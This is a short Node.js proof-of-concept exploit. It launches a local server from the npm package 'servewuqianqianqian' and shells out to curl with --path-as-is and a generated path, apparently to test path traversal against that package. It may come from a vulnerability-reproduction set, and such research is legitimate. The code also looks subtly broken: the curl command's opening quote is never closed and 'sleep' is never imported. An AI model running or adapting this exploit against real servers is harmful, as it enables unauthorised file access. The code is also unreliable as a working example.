function exploitFunction(payload) {
  const { genstr } = payload;

  // Start the server
  const exec = require("child_process").exec;
  const server = "node ./node_modules/servewuqianqianqian/index.js";
  exec(server, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    // Wait for the server to start
    sleep.sleep(2);

    // Generate the attack string
    const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Using 50 here as an example

    // Execute the attack string
    exec(attack_string, (error, stdout) => {
      if (error) {
        console.error(`Error executing attack: ${error}`);
        return;
      }

      console.log(`stdout: ${stdout}`);
    });
  });
}

module.exports = { exploitFunction };